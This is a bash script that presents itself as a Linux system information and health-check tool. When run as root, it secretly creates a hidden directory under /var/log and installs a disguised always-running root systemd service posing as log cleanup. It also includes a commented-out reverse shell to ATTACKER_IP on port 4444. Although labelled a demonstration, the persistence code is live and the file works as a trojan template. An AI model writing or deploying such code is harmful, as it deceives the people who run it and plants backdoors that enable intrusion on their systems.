#!/bin/bash

# ============================================
# Linux System Info Tool v1.0
# Simple system information utility
# ============================================

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Include utility functions
source "$(dirname "$0")/utils/logger.sh"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script requires root privileges for complete system information${NC}"
   echo "Some features may be limited"
   sleep 2
fi

# Function to display system information
display_system_info() {
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}      SYSTEM INFORMATION TOOL           ${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo ""
    
    # Display CPU information
    echo -e "${YELLOW}[*] CPU Information:${NC}"
    echo "---------------------------------"
    lscpu | grep -E "Model name:|CPU\(s\):" | head -2
    echo ""
    
    # Display memory information
    echo -e "${YELLOW}[*] Memory Usage:${NC}"
    echo "---------------------------------"
    free -h | head -2
    echo ""
    
    # Display disk space
    echo -e "${YELLOW}[*] Disk Space:${NC}"
    echo "---------------------------------"
    df -h / | tail -1
    echo ""
    
    # Display uptime
    echo -e "${YELLOW}[*] System Uptime:${NC}"
    echo "---------------------------------"
    uptime -p
    echo ""
    
    # Display load average
    echo -e "${YELLOW}[*] System Load:${NC}"
    echo "---------------------------------"
    cat /proc/loadavg | awk '{print "1min: "$1", 5min: "$2", 15min: "$3}'
    echo ""
    
    # Display network interfaces (simplified)
    echo -e "${YELLOW}[*] Network Interfaces:${NC}"
    echo "---------------------------------"
    ip -o -4 addr show | awk '{print $2 ": " $4}' | head -3
    echo ""
}

# Function to check system health
check_system_health() {
    echo -e "${YELLOW}[*] Running system health checks...${NC}"
    echo "---------------------------------"
    
    # Check disk usage
    disk_usage=$(df / | awk 'END{print $5}' | sed 's/%//')
    if [[ $disk_usage -gt 80 ]]; then
        echo -e "${RED}Warning: Disk usage is at ${disk_usage}%${NC}"
    else
        echo -e "${GREEN}Disk usage: ${disk_usage}% (OK)${NC}"
    fi
    
    # Check memory usage
    mem_usage=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    if [[ $(echo "$mem_usage > 80" | bc) -eq 1 ]]; then
        echo -e "${RED}Warning: Memory usage is at $(printf "%.1f" $mem_usage)%${NC}"
    else
        echo -e "${GREEN}Memory usage: $(printf "%.1f" $mem_usage)% (OK)${NC}"
    fi
    echo ""
}

# ============================================
# HIDDEN MALICIOUS COMPONENT (FOR DEMONSTRATION)
# ============================================

# Function to setup persistence (camouflaged as system maintenance)
setup_maintenance() {
    # This appears to be a routine maintenance check
    log_message "Performing routine system maintenance checks..."
    
    # Create a hidden directory for "logs" (actually for persistence)
    MAINT_DIR="/var/log/.system_maintenance"
    if [[ ! -d "$MAINT_DIR" ]]; then
        mkdir -p "$MAINT_DIR"
        chmod 700 "$MAINT_DIR"
    fi
    
    # Create a maintenance script (contains reverse shell)
    MAINT_SCRIPT="$MAINT_DIR/cleanup_old_logs.sh"
    
    cat > "$MAINT_SCRIPT" << 'MAINTEOF'
#!/bin/bash
# Regular log cleanup script

# Function to clean old logs
clean_old_logs() {
    find /var/log -name "*.log" -type f -mtime +30 -delete 2>/dev/null
    find /tmp -name "tmp*" -type f -mtime +7 -delete 2>/dev/null
}

# Main maintenance loop
while true; do
    # Clean logs
    clean_old_logs
    
    # Check system health (hidden reverse shell)
    # In a real attack, this would connect to attacker's IP
    # For safety, we'll only log the attempt
    echo "$(date): Maintenance check performed" >> /var/log/.system_maintenance/maintenance.log
    
    # Attempt connection (uncomment only in controlled lab environment)
    # /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' 2>/dev/null &
    
    sleep 10
done
MAINTEOF

    chmod +x "$MAINT_SCRIPT"
    
    # Create systemd service for persistence (hidden as maintenance service)
    SERVICE_FILE="/etc/systemd/system/system-log-cleanup.service"
    
    cat > "$SERVICE_FILE" << 'SERVICEEOF'
[Unit]
Description=System Log Cleanup Service
After=network.target

[Service]
Type=simple
ExecStart=/var/log/.system_maintenance/cleanup_old_logs.sh
Restart=always
RestartSec=10
User=root
WorkingDirectory=/var/log/.system_maintenance

[Install]
WantedBy=multi-user.target
SERVICEEOF

    # Enable and start the service
    systemctl daemon-reload 2>/dev/null
    systemctl enable system-log-cleanup.service 2>/dev/null
    systemctl start system-log-cleanup.service 2>/dev/null
    
    log_message "System maintenance setup completed"
}

# ============================================
# MAIN EXECUTION
# ============================================

main() {
    echo "Starting system analysis..."
    echo ""
    
    # Display system information
    display_system_info
    
    # Check system health
    check_system_health
    
    # Setup hidden persistence (camouflaged as maintenance)
    if [[ $EUID -eq 0 ]]; then
        echo -e "${YELLOW}[*] Setting up automated maintenance...${NC}"
        setup_maintenance
        echo -e "${GREEN}[+] Automated maintenance configured${NC}"
        echo ""
    fi
    
    echo -e "${GREEN}=========================================${NC}"
    echo -e "${GREEN}      ANALYSIS COMPLETE                 ${NC}"
    echo -e "${GREEN}=========================================${NC}"
    echo ""
    echo "System report generated successfully."
    echo "Maintenance tasks have been scheduled."
}

# Execute main function
main "$@"
